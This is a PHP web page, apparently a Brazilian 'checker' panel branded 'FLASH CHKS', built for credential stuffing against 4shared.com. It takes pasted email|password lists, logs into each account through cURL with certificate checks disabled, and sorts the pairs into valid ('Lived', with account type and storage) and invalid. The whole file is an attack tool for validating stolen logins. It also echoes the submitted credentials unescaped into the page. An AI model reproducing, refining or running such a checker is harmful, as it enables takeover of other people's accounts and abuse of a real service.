<?php


session_start();
error_reporting(0);
if(!isset($_SESSION['usuario']) and !isset($_SESSION['senha'])){
	echo "<script>location.href='/'</script>";
  die();
}


?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="UTF-8">
	<title>4Shared ON</title>
  <link href="https://fonts.googleapis.com/css?family=Aldrich|Molengo|Arsenal" rel="stylesheet">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js">
  </script>
	<style>
	html {
         font-size: 16px;
         background-color: #212121;
         color: #1ABB9C;
         font-family: 'Aldrich', sans-serif;

     }
     body {    
     	background-color: #212121;
     }
     .lista {
       width: 750px;
       height: 230px;
       text-align: center;
       resize: none;
       background-color: #424242;
       color: #69F0AE;
       font-size: 17px;
       border: 2px solid #69F0AE;
       border-radius: 3px;
       overflow: hidden;
     }
     .lista:focus {
     	outline: none;
     }
     .afs {
     	font-weight: bold;
     }
     .green {
     	background-color: #4caf50;
        color: rgba(255, 255, 255, 0.87);
        padding: 0.25em 0.5em;
        border-radius: 2px;
     }
     .red {
        background-color: #f44336;
        color: rgba(255, 255, 255, 0.87);
        padding: 0.25em 0.5em;
        border-radius: 2px;
     }
     .check {
     	background-color: #FFAB00;
     	color: rgba(255, 255, 255, 0.87);
        padding: 0.25em 0.5em;
        border-radius: 2px;
     }
     .botao {
     	margin-top: 10px;
     	width: 150px;
     	height: 50px;
     	background-color: #2C3A48;
     	border-radius: 5px;
     	border: none;
     	color: rgba(255, 255, 255, 0.87);
     	cursor: pointer;
     	    -webkit-appearance: button;
     	    transition: all .2s ease-in-out;
          font-family: 'Aldrich', sans-serif;
     }
     .botao:hover {
     	background-color: rgba(255, 255, 255, 0.87);
     	color: #2C3A48;
     }
     .botao:focus {
     	outline: none;
     }
     .test {
       resize: none;
       background-color: #2C3A48;
       color: #fff;
       border: none;
       text-align: center;
       width: 660px;
       height: 200px;
     }
    .test:focus {
       outline: none;
    }
    .back {
     color: #1ABB9C;
     text-decoration: none;
    }
    .back:hover {
      text-shadow: 1px 1px 1px #1ABB9C;
    }
    .panel{
      border-radius: 3px;
      background-color: #424242;
      width: 700px;
      height: 200px;
      border-right: 1px solid #00bc8c;
      border-left: 1px solid #00bc8c;
      border-bottom: 1px solid #00bc8c;
    }
    .panel-title{
      width: 700px;
      height: 25px;
      background-color: #00bc8c;
      border-bottom: 3px solid transparent;
    }
    .panelm{
      border-radius: 3px;
      background-color: #424242;
      width: 700px;
      height: 200px;
      border-right: 1px solid #e74c3c;
      border-left: 1px solid #e74c3c;
      border-bottom: 1px solid #e74c3c;
    }
    .panelm-title{
      width: 700px;
      height: 25px;
      background-color: #e74c3c;
      border-bottom: 3px solid transparent;
    }
	</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
</head>
<body>
<center>
<br>
<br>
<b><center><font color="white"><h1>4Shared - By FLASH CHKS</h1></font>
</center></b>
<form method="post">
    <textarea name="list" cols="90" rows="10" placeholder="FORMATO: EMAIL|SENHA" ></textarea><br><br>
	<button type="submit" name="x" class="botao">Testar</button>
    <br>
    <br>
</form>
	<center>
	APROVADAS<div id="accs_live"></div>
<br>
REPROVADAS<div id="accs_die"></div>
</div>
</center>
<?php
set_time_limit(0);
error_reporting(0);

class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
        //echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
if (isset($_POST['x'])) {
    $list = explode("\r\n", $_POST['list']);
    flush();
    foreach ($list as $value) {
        ob_implicit_flush(true);
        list($email , $senha ) = explode("|", $value);
        $email = trim($email);
        $senha = trim($senha);

$a = new cURL();
			
			//	variaveis para usar no postdata
			//   email: $email  
			//	 senha: $senha
		
        $b = $a->post('https://www.4shared.com/web/login','returnTo=https%3A%2F%2Fwww.4shared.com%2Faccount%2Fhome.jsp&ausk=&inviteId=&inviterName=&login='.$email.'&password='.$senha.'&_remember=off');

        $c = $a->get('https://www.4shared.com/account/home.jsp');


    if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }

    if (strpos($c, 'Sair')) { 
  $tipo = getStr($f, 'accountType: "AccType = ','"');
   $disco = getStr($f, '<div id="spaceInfo" class="spacePercent floatLeft alignRight lucida ffshadow">','</div>');
//    		$nome = GetStr($c, 'AQUI DENTRO FICA A TAG PARA PUXAR ALGO');
    	   
            echo '<script>$("#accs_live").prepend("Lived ➜ '.$email.' | '.$senha.' | '.$tipo.' '.$disco.'<br>");</script>';

//										| Nome: '.$nome.' | '.$nome.'

        }else{

            echo '<script>$("#accs_die").prepend("Die ➜ '.$email.' | '.$senha.'<br>");</script>';
        }
   flush(); ob_flush();
    }
}

?>